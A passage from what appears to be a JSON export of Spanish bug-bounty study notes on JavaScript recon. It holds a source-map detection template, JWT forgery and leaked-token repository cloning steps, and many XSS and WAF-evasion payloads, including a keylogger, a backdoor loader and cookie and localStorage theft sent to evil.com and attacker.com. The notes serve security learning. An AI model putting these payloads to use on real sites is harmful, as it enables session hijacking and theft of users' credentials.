body\nüîñ Plantilla de n√∫cleos avanzada\n\nCopiar\nid: exposed-sourcemap-files\n\ninfo:\n  name: Exposed JavaScript Source Map Files\n  author: Legion Hunter\n  severity: info\n  description: Detects exposed .js.map files that may contain original source code\n  metadata:\n    verified: true\n    max-request: 3\n  tags: exposure,sourcemap,javascript,files\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/{{path}}\"\n      - \"{{BaseURL}}/static/js/{{path}}\"\n      - \"{{BaseURL}}/assets/js/{{path}}\"\n    \n    payloads:\n      path:\n        - \"main.js.map\"\n        - \"app.js.map\"\n        - \"bundle.js.map\"\n        - \"index.js.map\"\n        - \"vendor.js.map\"\n        - \"chunk.js.map\"\n        - \"runtime.js.map\"\n        - \"polyfills.js.map\"\n        - \"main.{{randstr}}.js.map\"\n        - \"app.{{randstr}}.js.map\"\n    \n    attack: pitchfork\n    \n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - '\"version\":'\n          - '\"sources\":'\n          - '\"sourcesContent\":'\n          - '\"mappings\":'\n        condition: and\n      \n      - type: word\n        part: header\n        words:\n          - \"application/json\"\n          - \"text/plain\"\n        condition: or\n      \n      - type: status\n        status:\n          - 200\n    \n    extractors:\n      - type: regex\n        part: body\n        group: 1\n        regex:\n          - '\"file\":\\s*\"([^\"]+)\"'\n          - '\"sources\":\\s*\\[([^\\]]+)\\]'\n        name: source_info\n\n  - method: GET\n    path:\n      - \"{{BaseURL}}/{{js_file}}.map\"\n    \n    payloads:\n      js_file:\n        - \"main.js\"\n        - \"app.js\"\n        - \"bundle.js\"\n        - \"index.js\"\n        - \"vendor.js\"\n    \n    attack: pitchfork\n    \n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - '\"version\":'\n          - '\"sources\":'\n          - '\"mappings\":'\n        condition: and\n      \n      - type: status\n        status:\n          - 200\n\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n    \n    matchers:\n      - type: regex\n        part: body\n        regex:\n          - 'sourceMappingURL=([^\\\\s]+\\\\.js\\\\.map)'\n        name: sourcemap_url\n    \n    extractors:\n      - type: regex\n        part: body\n        group: 1\n        regex:\n          - 'sourceMappingURL=([^\\\\s]+\\\\.js\\\\.map)'\n        name: found_sourcemap\nDebe comenzar a intentar personalizar las plantillas seg√∫n su comprensi√≥n o si tiene acceso a los modelos LLM premium de alta precisi√≥n.\n\n‚öôÔ∏è Paso a paso c√≥mo podemos proceder para un objetivo en particular\n\nCopiar\nsubfinder -d example.com -all -recursive > subs.txt\nwaymore -i example.com -mode U -oU waymore_urls.txt\nnuclei -l subs.txt -t /path/to/templates/template-name.yaml\nnuclei -l waymore_urls.txt -t /path/to/templates/template-name.yaml\n\n\nhttps://github.com/denandz/sourcemapper EXTRACTOR DE SOURCEMAP.\nhttps://github.com/midoxnet/mapperplus MapperPlus facilita la extracci√≥n de c√≥digo fuente de una colecci√≥n de objetivos que tienen archivos .js.map expuestos p√∫blicamente.",
      "editedTs": 1761495743937,
      "status": "excelente"
    },
    {
      "id": "7gxkc30",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/js-file-leak-could-lead-to-app-exploits-260c8f008c00",
      "note": "NADA interesante pero si Este archivo revel√≥ l√≥gica de backend, t√≠picamente escrita en ASP (Active Server Pages )",
      "editedTs": 1761496016613,
      "status": "regular"
    },
    {
      "id": "8nsarpj",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/meetcyber/js-is-the-new-s3-how-i-mined-tokens-pii-devops-secrets-from-javascript-for-bounties-13b6bdf1b829",
      "note": "Qu√© puedes extraer:\nAPI Keys:Firebase, GCP, AWS, Stripe, Mapbox, etc.\nTokens:JWT, tokens de portador OAuth, tokens de actualizaci√≥n\nPII: Correos electr√≥nicos, n√∫meros de tel√©fono, n√∫meros de cuenta\nInternal Logic: Verificaciones de roles, variaciones de puntos finales\nCI/CD Secrets:Nombres de repositorios, artefactos de compilaci√≥n, dominios de desarrollo\n\n\nDescodificaci√≥n de ADN\": extracci√≥n de datos confidenciales de JS\nüîçQu√© buscar:\napi_key, secret, auth, access_token, jwt,client_id\nphone=, email=, user_id,account_number\n.git, ci/, internal, staging, localhost:,dev.\n\n\n¬øQu√© causa estas fugas?\nDesarrolladores que utilizan .envpero crean aplicaciones React/Vue que los exponen\nOlvidar eliminar las configuraciones de depuraci√≥n antes de enviar a producci√≥n\nTokens codificados para puesta en escena ‚Üí promovidos a producci√≥n sin cambios\nCI/CD agregando cadenas de versi√≥n e informaci√≥n del repositorio en variables de ventana",
      "editedTs": 1761517057352,
      "status": "buen"
    },
    {
      "id": "d9jqiss",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/from-jsleaks-to-jwt-tokens-extracting-secrets-from-javascript-like-a-pro-dd351d43a9f8",
      "note": "Variables de entorno ( REACT_APP_, NEXT_PUBLIC_, etc.)\n\nSupongamos que encuentra un JWT aparentemente v√°lido en un archivo JS. Esto es lo que puede hacer:\n\nPaso a paso:\n\nDecodifica el JWT usando https://jwt.io o jwt-tool:\n\nInspeccionar la carga √∫til: buscar admin: true, userid, email, scope, etc.\nReprod√∫zcalo usando Burp o Postman contra un punto final de API.\nIntente modificarlo y volver a firmarlo si alg: noneest√° presente (error de configuraci√≥n com√∫n):\nCopiar\n{\n  \"alg\": \"none\",\n  \"typ\": \"JWT\"\n}\nFuerza bruta para recuperar el secreto HMAC con herramientas como jwt-crackero hashcat.\nOtros escenarios:\n\nUtilice tokens portadores codificados para realizar llamadas API como administrador.\nAbusar de las credenciales de Firebase o S3 para leer/escribir datos p√∫blicos.\nCombine con configuraciones err√≥neas de CORS para realizar acceso a API de origen cruzado.\n\nBuscar:\n\nFunciones ofuscadas como a('reset-password')or('/admin')\nUtilice embellecedores JS: js-beautify,prettier\nIntente resolver fragmentos de Webpack para exponer la l√≥gica modular\nUna vez que comprenda c√≥mo se comunica el front-end con el back-end, podr√°:\n\nSolicitudes de falsificaci√≥n\nAcceder a rutas de administraci√≥n no protegidas\nReproducir solicitudes de API como otros usuarios\nConsejos profesionales para un mejor reconocimiento de JS\n\nCompruebe siempre los archivos JS archivados (Wayback, gau, etc.)\nNo ignore el c√≥digo minimizado: embellezcalo\nMira JS externo desde herramientas de terceros (widgets de chat, complementos)\nEst√© atento a secretos ofuscados o blobs Base64\nTenga paciencia: una l√≠nea de JS puede valer miles",
      "editedTs": 1761517352299,
      "status": "muybueno"
    },
    {
      "id": "bu5iypv",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/%EF%B8%8F-%EF%B8%8F-javascript-opsec-fails-how-i-found-secrets-endpoints-and-pii-in-js-files-ef02cead4648",
      "note": "Busque en las carpetas /scripts, /static, /js/, y/assets/\n\nTruco extra:\nUtilice curlo wget+ js-beautifypara imprimir JS de forma ordenada antes de analizar:\n\nCopiar\ncurl https://target.com/assets/main.js | js-beautify - > pretty.js",
      "editedTs": 1761517655377,
      "status": "muybueno"
    },
    {
      "id": "tk92o5j",
      "title": "Nuevo informe",
      "payload": "https://s41n1k.medium.com/how-i-downloaded-all-bitbucket-repos-by-finding-a-leaked-token-in-a-js-file-for-4k-bounty-a701d6effa50",
      "note": "se trata sobre un filtracion de token valido de BITBUCKET_READ_TOKEN de cual pudo descargarse todos los repos presentes que contenian codigo del servidor etc.Bounty 4k. util explica que comando utlizo para enumerar todos los proyectos repositorio etc.\n\nObtener informaci√≥n del espacio de trabajo\n\nPara enumerar todos los repositorios disponibles en el espacio de trabajo, ejecute el siguiente comando:\ncurl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?page=1 --header \"Authorization: Bearer <BITBUCKET_READ_TOKEN>\"\nEsto devolver√° informaci√≥n sobre todos los repositorios en el espacio de trabajo.\n\nPaso 3: Obtener informaci√≥n del repositorio\n\nPara recuperar informaci√≥n sobre un repositorio espec√≠fico, utilice el siguiente comando:\ncurl https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here/repository-Name-Here --header \"Authorization: Bearer <BITBUCKET_READ_TOKEN>\"\n\nPaso 4: Obtener informaci√≥n del proyecto\n\nPara buscar un proyecto, utilice la clave del proyecto (por ejemplo, EHP) en la consulta:\ncurl \"https://api.bitbucket.org/2.0/repositories/workspaceNmae-Here?q=project.key%3D%22EHP%22\" \\ --header \"Authorization: Bearer <BITBUCKET_READ_TOKEN>\"\n\nPaso 5: Clonar cada repositorio\n\nPara clonar un repositorio, use el siguiente comando:\ngit clone https://x-token-auth:<BITBUCKET_READ_TOKEN>@bitbucket.org/workspaceNmae-Here/repository-Name-Here.git\n>Reemplazar <BITBUCKET_READ_TOKEN>con su token completo.",
      "editedTs": 1761517905660,
      "status": "buen"
    },
    {
      "id": "ohf3a2p",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://iaraoz.medium.com/ultimate-api-bug-bounty-find-secure-hidden-api-endpoints-139c8f0a061a",
      "note": "nada interesante.",
      "editedTs": 1761518019861,
      "status": "monton"
    },
    {
      "id": "t9ccu3s",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/javascript-file-mining-for-hidden-endpoints-with-real-bug-bounty-examples-a6a29f2ec4fc",
      "note": "nada.",
      "editedTs": 1761518153418,
      "status": "monton"
    },
    {
      "id": "5y0zpry",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/javascript-files-a-pentesters-treasure-trove-ec4c393a23c5",
      "note": "nada.",
      "editedTs": 1761518540306,
      "status": "monton"
    },
    {
      "id": "nh69vye",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://javascript.plainenglish.io/prompt-engineering-toolkit-for-javascript-recon-2025-edition-6209c57ce8ef",
      "note": "Sigue el flujo, no solo el c√≥digo\nEn lugar de leer un archivo JS de arriba a abajo, pregunte:\n\n¬øD√≥nde ingresan los datos ? (por ejemplo, entradas de formulario, par√°metros de consulta)\n¬øC√≥mo se procesa ? (por ejemplo, codificaci√≥n, hash, cifrado)\n¬øD√≥nde sale ? (por ejemplo, llamadas API, cookies, almacenamiento local)\nPiensa como un paquete. ¬øC√≥mo se mover√≠a tu carga √∫til a trav√©s del JS?\n\nüß© 2. Asignar JS al comportamiento del backend\nCada .fetch()llamada, cada axios.post(), es una pista para el dise√±o del backend:\n\n¬øAutorizaci√≥n? ‚Üí/api/login\n¬øSubir archivo? ‚Üí/v1/user/avatar/upload\n¬øComprobaci√≥n de roles? ‚Üíif (user.role === 'admin')\nJS es la documentaci√≥n de tu API disfrazada , especialmente cuando Swagger no est√° expuesto.\n\nüïµÔ∏è 3. Busca la confianza mal depositada\nFrontend JS a menudo revela:\n\nValidaci√≥n del lado del cliente (sin verificaci√≥n del servidor)\nL√≥gica de reutilizaci√≥n de tokens\nBanderas ocultas para funciones \"beta\" o \"administrativas\"\nTodo aquello en lo que el frontend conf√≠a pero que el servidor no vuelve a validar es una puerta que espera ser abierta de una patada.\n\nüéØ 4. Apunta a los supuestos m√°s d√©biles\nSi JS asume:\n\nEl token siempre es v√°lido ‚úÖ\nEl rol del usuario siempre es preciso ‚úÖ\nEl correo electr√≥nico fue verificado ‚úÖ\n‚Ä¶eso es una suposici√≥n de seguridad . Y las suposiciones de seguridad son donde nacen los errores.\n\nüß† 5. Deja que las indicaciones te ayuden a pensar de manera diferente\nLa IA no solo ahorra tiempo: tambi√©n te proporciona un segundo cerebro:\n\nUno que no se cansa de leer 20.000 l√≠neas de JS\nAlguien que pueda explicar los flujos de cifrado en un lenguaje sencillo.\nUno que ayuda a encadenar l√≥gica no relacionada en rutas de ataque.",
      "editedTs": 1761518544535,
      "status": "buen"
    },
    {
      "id": "rejj49k",
      "title": "Nuevo informe",
      "payload": "https://javascript.plainenglish.io/dom-xss-the-client-side-time-bomb-in-your-javascript-1ff51e44fd35",
      "note": "Explicaque hasta los frame mas importante como react, angular etc pueden \na ser vulnerables con sink doom.\n\n\n1. React.js\nFregadero com√∫n:dangerouslySetInnerHTML\nProblema: Los desarrolladores asumen incorrectamente que los datos est√°n desinfectados.\nEjemplo de explotaci√≥n:\n\n< div  dangerouslySetInnerHTML = {{  __html:  ubicaci√≥n.hash }} />\nSi el hash contiene <img src=x onerror=alert(1)>, se ejecutar√°.\n\n2. Vue.js\nHundir:v-html\nSi se utiliza con una entrada no desinfectada, se produce un error XSS.\nEjemplo de explotaci√≥n:\n\n< div  v -html = \"contenido malicioso \" > </div>\nLas cargas √∫tiles desde URL o API de backend pueden representar HTML sin escape.\n\n3. Angular.js (1.x)\nSi bien Angular realiza un escape consciente del contexto, los desarrolladores pueden anularlo.\nCaso vulnerable:\n\n< span  ng-bind-html = \"HTML no confiable\" > </ span >\nEl uso $sce.trustAsHtml()incorrecto puede exponerlo al riesgo de XSS.\n\n4. Aplicaciones basadas en jQuery\nHundir:$(selector).html(untrusted_input)\nLa manipulaci√≥n de jQuery a menudo omite la revisi√≥n de seguridad\nConsejo: Busque .html(, .append(, o .write(dentro de los scripts.\n\n\n\n\n¬øPor qu√© los desarrolladores utilizan DOM?\nPara actualizar el contenido sin refrescar la p√°gina (por ejemplo, SPA)\nPara validaci√≥n de formularios , interacci√≥n de UI, animaciones\nPara cargar datos de forma asincr√≥nica mediante AJAX o Fetch\nHabilite aplicaciones web ricas e interactivas\nD√≥nde se utiliza:\nC√≥digo frontend de JavaScript: document.getElementById(), innerHTML, location.href, etc.\nL√≥gica basada en eventos y actualizaciones de p√°ginas",
      "editedTs": 1761519027107,
      "status": "excelente"
    },
    {
      "id": "hh9uugz",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/how-did-i-hack-a-website-just-by-reading-js-files-80f73cbfd4c1",
      "note": "meh.",
      "editedTs": 1761519093876,
      "status": "monton"
    },
    {
      "id": "iu60cbk",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@ibtissamhammadi1/how-i-found-an-8-427-js-security-bug-in-30-minutes-1c37d97bdae1",
      "note": "nha, pagaron bounty 8k pero nada de otro mundo la metodologia.",
      "editedTs": 1761519231549,
      "status": "monton"
    },
    {
      "id": "p2g5e6r",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/javascript-for-hackers-the-ultimate-guide-for-offensive-security-5631473baa22",
      "note": "Automatizaci√≥n de ataques con bots de JavaScript\nLos piratas inform√°ticos utilizan navegadores sin cabeza como Puppeteer o Playwright con JavaScript personalizado para:\n\nAutomatizar los intentos de inicio de sesi√≥n\nRealizar pruebas XSS de fuerza bruta\nExtraer contenido y analizar encabezados CSP\nEjemplo:\n\nCopiar\nconst puppeteer = require('puppeteer');\n(async () => {\n  const browser = await puppeteer.launch();\n  const page = await browser.newPage();\n  await page.goto('https://target.com');\n  await browser.close();\n})();\nCuando se trata de explotar JavaScript de forma creativa , pocas mentes son tan ingeniosas como Gareth Heyes. Su libro \"JavaScript para Hackers\" est√° repleto de t√©cnicas alucinantes que evaden WAF y descifran el an√°lisis sint√°ctico, difuminando la l√≠nea entre el arte y el ataque. A continuaci√≥n, se presentan los hacks de JavaScript m√°s innovadores y creativos que puedes usar para evadir filtros , activar la ejecuci√≥n en contextos inusuales y manipular el navegador a tu antojo .\n\nEnfoque √∫nico de Gareth Heyes\n1. instanceof+ Symbol.hasInstancepara llamar a funciones\nAl utilizar el instanceofoperador de forma creativa con Symbol.hasInstance, puede ejecutar c√≥digo desde una cadena sin par√©ntesis.\n\nCopiar\n'alert(1)' instanceof { [Symbol.hasInstance]: eval };\n// Executes alert(1)\nPor qu√© funciona: instanceofllama a la funci√≥n detr√°s de Symbol.hasInstance, pasando el valor de la izquierda como argumento.\n\n2. Cadenas de plantilla etiquetadas + Constructor de funciones + Comillas triples invertidas\nPuede generar y ejecutar instant√°neamente funciones arbitrarias sin usar eval, utilizando plantillas etiquetadas con y comillas triples .Function\n\nCopiar\nFunction`x${'alert(1337)'}```;\n// Instantly creates and runs alert(1337)\nEsto parece extra√±o, evita los par√©ntesis y puede evadir los filtros XSS est√°ticos en algunas aplicaciones.\n\n3. onerror+ throwcomo un disparador de evaluaci√≥n indirecta\nEstablezca onerroren eval, luego throwuna cadena personalizada para ejecutar c√≥digo arbitrario sin() .\n\nCopiar\nonerror = eval;\nthrow \"=alert(1)\";\nPara vencer los filtros de caracteres, puedes utilizar separadores de l√≠nea/p√°rrafo Unicode:\n\nCopiar\neval(\"onerror=\\u2028eval\\u2029throw '=alert(1)'\");\n4. Reflect.apply.callpara la ejecuci√≥n de funciones ocultas\nAl aprovechar Reflect.applyy call, puede invocar cualquier funci√≥n con control total sobre thislos argumentos y , todo sin par√©ntesis .\n\nCopiar\nReflect.apply.call`${alert}${window}${[1337]}`;\n// Calls alert(1337) stealthily\nPor qu√© es brillante: Esto evita muchos filtros ingenuos que buscan llamadas de funciones directas.\n\n5. Reemplazar valueOfo toStringactivar alertas mediante coerci√≥n de tipo\nSecuestrar el tipo de JS para llamar indirectamente :alert\n\nCopiar\nvalueOf = alert;\nwindow + 1; // Triggers alert()\ntoString = alert;\nwindow + ''; // Also works\nSin par√©ntesis. No hay llamada de funci√≥n obvia.\n\n6. Llamadas alertmediante .replace()plantillas etiquetadas\nPuedes abusar String.prototype.replacede una plantilla etiquetada para llamar a una alerta con una cadena coincidente :\n\nCopiar\n'a'.replace`a${alert}`;\n// Triggers alert('a')\nPara controlar el valor pasado:\n\nCopiar\n'a'.replace.call`1${/./}${alert}`;\n// Triggers alert('1')\n7. Cadenas de plantilla anidadas en la parte superior\nPuede anidar cadenas de plantillas infinitamente , ejecutando cargas √∫tiles profundamente ofuscadas :\n\nCopiar\n`${`${`${`${alert(1)}`}`}`}`;\n// Still triggers alert(1)\nEsto es visualmente ca√≥tico, rompe los filtros y confunde al analizador.\n\n8. Shebang ( #!) como comentario de JavaScript para cargas √∫tiles poco claras\nDescubierto mediante fuzzing, #!en la parte superior de un archivo JS se trata como un comentario.\n\nCopiar\n#!alert(1337)\nSi no hay ning√∫n car√°cter antes, ignora el motor JS como si fuera una l√≠nea de comentario leg√≠tima. ¬°Qu√© enga√±o!\n\n9. Fuzzing din√°mico de protocolos para javascript:ejecuci√≥n\nHeyes utiliz√≥ pruebas de puntos de c√≥digo para encontrar caracteres no visibles permitidos en javascript:los enlaces:\n\nCopiar\nanchor.href = `${String.fromCodePoint(12)}javascript:alert(1)`;\n// Still triggers alert()\nLos navegadores analizan esto a pesar del car√°cter invisible, rompiendo las suposiciones de los limpiadores de enlaces.\n\n10. Ofuscaci√≥n de JavaScript no alfanum√©rico\nAl usar trucos de escape hexadecimales, octales y Unicode, puedes escribir cargas √∫tiles sin palabras clave reconocibles :\n\nCopiar\neval('\\x61lert(1)'); // \\x61 = 'a'\neval('\\141lert(1)'); // Octal \\141 = 'a'\neval('\\u0061lert(1)'); // Unicode\nCombine los tres y tendr√° cargas √∫tiles que perforan el WAF y que parecen completamente inofensivas.\n\n\n\n\n\nManipulaci√≥n avanzada del DOM para phishing y clickjacking\nJavaScript permite a los atacantes clonar formularios de inicio de sesi√≥n , superponer botones falsos o redirigir a los usuarios sin recargar la p√°gina.\n\nInyecci√≥n de formularios de inicio de sesi√≥n falsos\nCopiar\ndocument.body.innerHTML = '<form action=\"http://evil.com\"><input name=\"user\"><input name=\"pass\"><input type=\"submit\"></form>';\nClickjacking con JavaScript\nCopiar\n<iframe src=\"https://target.com\" style=\"opacity:0;position:absolute;z-index:999;\"></iframe>\nCon un posicionamiento preciso z-index, el atacante puede enga√±ar a los usuarios para que hagan clic en elementos ocultos.\n\nRegistro de teclas con JavaScript\nAl incorporar un keylogger a trav√©s de XSS o scripts inseguros, los atacantes pueden registrar cada pulsaci√≥n de tecla:\n\nCopiar\ndocument.onkeypress = function(e){\n  fetch('http://evil.com/log?c=' + e.key);\n}\nEsto se puede combinar con el volcado de localStorage o sessionStorage para una extracci√≥n completa de datos del cliente.\n\nEscaneo de puertos desde el navegador\nJavaScript puede ejecutar escaneos de puertos internos ocultos utilizando elementos HTML como <img>o <iframe>.\n\nCopiar\nvar ports = [80, 443, 8080];\nports.forEach(function(port) {\n  var img = new Image();\n  img.src = \"http://192.168.0.1:\" + port;\n});\nEsta t√©cnica se utiliza en el reconocimiento de red interna basado en navegador .\n\nEvitar la validaci√≥n del lado del cliente\nJavaScript permite a los atacantes eludir las validaciones de formularios realizadas en el lado del cliente:\n\nCopiar\ndocument.querySelector(\"form\").submit();\nO modificar los valores del campo directamente:\n\nCopiar\ndocument.querySelector(\"#price\").value = 1;\nSi el servidor no valida las entradas de forma independiente, esto conduce a una escalada de privilegios o transacciones no autorizadas .\n\nAtaques CSRF con JavaScript\nCuando no existen protecciones CSRF, se puede usar JavaScript para falsificar solicitudes no autorizadas:\n\nCopiar\nfetch(\"https://victim.com/change-email\", {\n  method: \"POST\",\n  credentials: \"include\",\n  body: \"email=attacker@example.com\"\n});\nEsto utiliza la sesi√≥n de la v√≠ctima para ejecutar acciones en su nombre.\n\nToma de huellas dactilares de v√≠ctimas con JavaScript\nLos piratas inform√°ticos recopilan informaci√≥n mediante scripts de toma de huellas dactilares:\n\nCopiar\nconsole.log(navigator.userAgent);\nconsole.log(screen.width, screen.height);\nconsole.log(navigator.plugins);\nEstos datos ayudan a personalizar las cargas √∫tiles o seleccionar exploits espec√≠ficos del navegador.\n\nConectando navegadores con BeEF Framework\nBrowser Exploitation Framework (BeEF) es una poderosa herramienta que utiliza JavaScript para atrapar v√≠ctimas y lanzar ataques del lado del cliente .",
      "editedTs": 1761519587033,
      "status": "excelente"
    },
    {
      "id": "a6b4cdx",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/500-bounty-xss-via-javascript-urls-a04900631701",
      "note": "Interesante es un xss simple pero como lo logro reddit interesante con ese parametro de redirect que se activa luego de la autenticacion 500 bounty.",
      "editedTs": 1761520518093,
      "status": "buen"
    },
    {
      "id": "332dvho",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/uncover-hidden-endpoints-secrets-and-vulnerabilities-buried-inside-javascript-files-ea965b43f969",
      "note": "Mejores pr√°cticas para la reconstrucci√≥n de JavaScript\n\nSiempre embellece/minimiza JS con herramientas como js-beautify.\nUtilice un proxy local para interceptar JS cargado din√°micamente.\nCombine an√°lisis est√°tico y din√°mico.\nNo olvide los mapas fuente (archivos .map): pueden revelar el c√≥digo fuente completo.",
      "editedTs": 1761520830380,
      "status": "buen"
    },
    {
      "id": "f4xbr7e",
      "title": "Nuevo informe",
      "payload": "https://javascript.plainenglish.io/javascript-jwts-and-the-key-that-shouldnt-exist-d97c01d0ce9e",
      "note": "Interesante pudo ingresar como admin mediante la exposicion de la HS256 (clave sim√©trica) se usa ampliamente, pero si la clave se filtra, se acab√≥ el juego. solo creo un usuario le saco el jwt Reemplac√© el JWT existente en LocalStorage con el falsificado, actualic√© /admin‚Ä¶",
      "editedTs": 1761521107942,
      "status": "buen"
    },
    {
      "id": "ikp4umg",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://osintteam.blog/dom-xss-via-postmessage-javascript-injection-inside-iframes-8a5f6912fba4",
      "note": "interesante websocket xss esta bueno con colaborator de burp suite.\nya que se comunica con las demas ventanas sin restriccion alguna.",
      "editedTs": 1761521393106,
      "status": "regular"
    },
    {
      "id": "fk1rc8v",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/from-js-file-to-jackpot-how-i-found-api-keys-and-secrets-hidden-in-production-code-87af8750b751",
      "note": ": Observando los jugosos archivos JS\nNo todos los archivos JS merecen tu atenci√≥n. Filtr√© bibliotecas aburridas como:\n\n/jquery.min.js\n/bootstrap.bundle.js\n/react.production.min.js\n\n/static/js/authHandler.js\n/assets/scripts/paymentFlow.js\n/cdn/app/main-prod.min.js\n(Por lo general, est√°n codificados a mano = ¬° hay una alta probabilidad de encontrar algo )\n\nConsejo adicional: T√©cnicas avanzadas para la divulgaci√≥n de informaci√≥n confidencial\nüîπ Patrones de coincidencia de expresiones regulares :\n\nCopiar\nregex\n['\"][A-Za-z0-9_\\-]{16,}['\"]\nCaptura secretos codificados en base64.\n\nüîπ Encontrar c√≥digo comentado :\n\nCopiar\ngrep -oP '(?<=//).+' all_javascript_dump.txt\nPorque a veces los desarrolladores dejan hojas de ruta completas en los comentarios.",
      "editedTs": 1761521608087,
      "status": "buen"
    },
    {
      "id": "b1hcqlu",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/%EF%B8%8F-%EF%B8%8F-unlisted-but-not-unseen-how-i-found-the-admin-panel-in-a-javascript-comment-f34af758b4c8",
      "note": "esta bueno encontre un js cometario con url no listada ingreso \nluego analizo otra ves el js y encontre el token del admin lo ingreso \ny boom admin.",
      "editedTs": 1761521768333,
      "status": "regular"
    },
    {
      "id": "p1dla77",
      "title": "Nuevo informe",
      "payload": "https://hackersatty.medium.com/bug-bounty-how-i-leaked-admin-metadata-from-a-low-privileged-account-a-deep-dive-into-23e0d699d792",
      "note": "analisis de js encontro una logica de manejo de id en la url lo cambio y le retorno metadata oculta etc idor.",
      "editedTs": 1761522138651,
      "status": "regular"
    },
    {
      "id": "imabo6i",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/the-image-that-spoke-javascript-bdbd368921e4",
      "note": "xss ciego carga util, en img.\n\n\"><img src=1 onerror=\"url=String.fromCharCode(104,116,116,112,...)+encodeURIComponent(document['cookie']);xhttp= new XMLHttpRequest();xhttp.open('GET',url,true);xhttp.send();\">",
      "editedTs": 1761522335779,
      "status": "buen"
    },
    {
      "id": "9meouda",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/%EF%B8%8F-unsafe-eval-unlimited-control-how-a-js-sink-let-me-run-anything-60794929a295",
      "note": "Carga √∫til 2: Shell de ejecuci√≥n de JS completo (tambi√©n conocido como RCE de JavaScript)\n¬øQu√© pasar√≠a si hici√©ramos de esto un XSS a RAT?\n\nCopiar\n(() => {\n  fetch('https://evil.com/log?u=' + navigator.userAgent + '&d=' + document.domain);\n  let script = document.createElement('script');\n  script.src = 'https://evil.com/backdoor.js';\n  document.body.appendChild(script);\n})();\nResultado: Puerta trasera JS instalada. Prueba de concepto de secuestro de sesi√≥n implementada.\n\nEl premio gordo: acceso al almacenamiento local y a los JWT\nEncadenando un poco m√°s eval()de magia:\n\nCopiar\nfetch('https://evil.com/ls?data=' + JSON.stringify(localStorage))\n‚úÖ Consegu√≠:\n\nToken de autenticaci√≥n JWT\nClaves API almacenadas en cach√© por el frontend\nPreferencias del usuario (algunas con modos de pago)\nTokens de sesi√≥n SSO\nS√≠. Todo porque eval()confiamos en todo lo que viene de la API.\n\nüéØ Carga √∫til final (para informe):\nCopiar\n{\n  \"action\": \"fetch('https://attacker.com/steal?data=' + btoa(document.cookie + '|' + JSON.stringify(localStorage)))\"\n}\nImpacto :\n\nDOM XSS ‚Üí Ejecuci√≥n completa de JS\nToma de control de sesi√≥n\nTokens de acceso + JWT robados\nSecuestro de SSO (vinculado a Google Workspace)\nRCE de frontend a trav√©s de una puerta trasera JS\nDivulgaci√≥n de datos de localStorage\nPodr√≠a secuestrar a CUALQUIER usuario conectado\nLecciones aprendidas\neval()Nunca es seguro, especialmente con datos no validados.\nEl reconocimiento masivo de archivos JS archivados es una mina de oro.\nLocalStorage + cookies = objetivos jugosos.\nEl XSS basado en DOM no est√° muerto: simplemente evolucion√≥.",
      "editedTs": 1761522561000,
      "status": "excelente"
    },
    {
      "id": "iln1hgu",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/hidden-tokens-open-wallets-how-i-found-payment-api-keys-in-production-javascript-7810b3113e04",
      "note": "meh, encontro api key quemada, activa entro miro que mas puede hacer crear acciones etc esta bueno.",
      "editedTs": 1761522697415,
      "status": "regular"
    },
    {
      "id": "2lwm89o",
      "title": "Nuevo informe",
      "payload": "https://systemweakness.com/how-a-javascript-file-led-me-to-an-open-redirect-vulnerability-eefce51303b2",
      "note": "pues que dire analizando un js encontre un parametro de redirect externo y lo probe no funciono lo redirigio al logyn pero se logeo y boom funciono creo un sitio falso parecido al logyn y bueno lo subio a su githubpage y explico y dio mas impacto al informe valido.",
      "editedTs": 1761523163054,
      "status": "regular"
    },
    {
      "id": "x37qrbl",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/from-csp-to-omg-how-a-tiny-misconfigured-header-let-me-run-js-anywhere-054e30090230",
      "note": "analizando un js encontre un parametro de busqueda inyecto metacaracteres y no fueron codificados o escapado previamente en el doom aplico xss y boom lo escalo robo de cookie si tenia csp pero debil.",
      "editedTs": 1761523306292,
      "status": "buen"
    },
    {
      "id": "ybskohp",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://medium.com/@zoningxtr/mastering-event-handlers-in-javascript-and-html-the-complete-guide-with-examples-60ef2c4d025b",
      "note": "super bueno varios controladores de eventos super para utilizar en carga util y mas recomendado.",
      "editedTs": 1761523463565,
      "status": "excelente"
    },
    {
      "id": "3j16oxj",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/exposed-and-ignored-how-a-javascript-api-key-gave-me-full-cloud-access-%EF%B8%8F-e00a7301ffb6",
      "note": "brutal con un simple api key quemada en js logro acceder a varios recursos criticos y ademas de rce etc simple potente bueno.",
      "editedTs": 1761523625929,
      "status": "muybueno"
    },
    {
      "id": "7g3p9hw",
      "title": "Nuevo informe",
      "payload": "https://freedium.cfd/https://infosecwriteups.com/dom-inated-how-a-tiny-js-sink-turned-into-critical-xss-a9a1dbe97df2",
